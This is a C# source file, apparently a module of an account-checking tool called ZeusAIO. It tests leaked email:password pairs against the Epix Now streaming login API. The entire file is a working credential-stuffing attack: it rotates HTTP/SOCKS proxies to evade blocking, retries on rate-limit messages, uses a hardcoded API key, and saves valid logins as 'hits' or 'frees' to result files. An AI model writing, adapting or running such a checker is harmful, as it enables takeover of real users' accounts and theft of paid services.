using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Epixnow
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.KeepAlive = true;
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.Cookies = null;
                            httpRequest.AddHeader("Accept", "*/*");
                            httpRequest.AddHeader("Pragma", "no-cache");
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string source = httpRequest.Post("https://api.epixnow.com/v2/sessions", "{\"device\":{\"guid\":\"b3425835-7d63-47b1-8a5a-6c2fa4e6d4f8\",\"format\":\"console\",\"os\":\"web\",\"display_width\":1180,\"display_height\":969,\"app_version\":\"1.0.2\",\"model\":\"browser\",\"manufacturer\":\"google\"},\"apikey\":\"53e208a9bbaee479903f43b39d7301f7\"}", "application/json").ToString();
                            string value = Parse(source, "\"session_token\":\"", "\",");
                            httpRequest.AddHeader("origin", "https://www.epixnow.com");
                            httpRequest.AddHeader("referer", "https://www.epixnow.com/login/");
                            httpRequest.AddHeader("accept", "application/json");
                            httpRequest.AddHeader("X-Session-Token", value);
                            string text5 = httpRequest.Post("https://api.epixnow.com/v2/epix_user_session", "{\"user\":{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}}", "application/json").ToString();
                            if (text5.Contains("user_session"))
                            {
                                if (text5.Contains("It looks like you're missing out! Subscribe and get unlimited access to exclusive shows, 1000s of movies and more."))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - EPIXNOW] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Epixnow_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - EPIXNOW] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Epixnow_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                            }
                            else if (text5.Contains("log in to your account at this time. Please try again later"))
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                            else if (text5.Contains("Your email and password do not match."))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                        break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
            private static string Parse(string source, string left, string right)
            {
                return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
                {
                right
                }, StringSplitOptions.None)[0];
            }
        }
    }

